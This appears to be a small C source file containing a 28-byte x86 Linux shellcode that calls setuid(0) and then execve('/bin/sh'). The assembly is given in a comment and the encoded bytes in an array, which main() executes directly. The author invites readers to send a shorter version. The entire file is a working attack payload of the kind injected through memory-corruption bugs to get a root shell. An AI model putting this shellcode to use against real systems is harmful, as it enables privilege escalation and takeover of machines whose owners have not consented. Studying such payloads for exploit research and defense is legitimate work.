/*
	setuid(0) + execve() /bin/sh, 28 bytes
	by sd@cdi.cz, if you can make it _shorter_ than 28 bytes, please
	send me changes.

	push	$0x17
	pop	%eax
	xor	%ebx, %ebx
	int	$0x80
	push	%ebx
	.byte	0x68
	.ascii	"n/sh"
	.byte	0x68
	.ascii	"//bi"
	mov    %esp,%ebx
	push   %eax
	push   %ebx
	mov    %esp,%ecx
	mov    $0xb,%al
	int    $0x80
*/


unsigned char sc[] =
	"\x6a\x17\x58\x31\xdb\xcd\x80\x53"
	"\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	"\x62\x69\x89\xe3\x50\x53\x89\xe1"
	"\xb0\x0b\xcd\x80";

int	main()
{
	void		(*execme)() = (void *) sc;
	execme();
	return 0;
}
